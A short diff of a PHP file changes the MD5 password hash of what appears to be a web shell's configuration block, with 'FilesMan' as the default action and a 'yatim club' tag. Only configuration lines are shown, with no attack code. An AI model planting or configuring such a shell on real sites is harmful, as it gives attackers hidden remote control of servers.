@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "60ddc22a415b9f7ce5bd6063ace1ce6a"; //yatim club
+$password = "bfe2494bf2d82b67993182a46a40122d"; //yatim club
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
